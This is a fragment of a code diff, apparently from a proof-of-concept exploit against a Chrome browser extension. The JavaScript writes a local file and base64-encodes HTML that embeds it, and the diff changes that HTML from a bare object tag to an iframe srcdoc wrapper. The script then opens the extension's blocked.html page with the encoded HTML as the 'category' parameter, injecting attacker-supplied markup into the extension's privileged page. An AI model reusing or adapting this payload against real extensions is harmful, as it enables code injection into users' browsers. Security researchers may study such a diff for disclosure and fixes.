@@ -11,7 +11,7 @@ function init(fs) {
       fileWriter.onwriteend = function(e) {
         const url = fileEntry.toURL();
         const button = document.querySelector("button");
-        var payloadHTML = btoa('<object data="' + url + '"></object>');
+        var payloadHTML = btoa('<iframe srcdoc="<object data="' + url + '"></object>" />');
         window.open(`chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=${payloadHTML}`);
       };
       fileWriter.onerror = window.errorHandler;
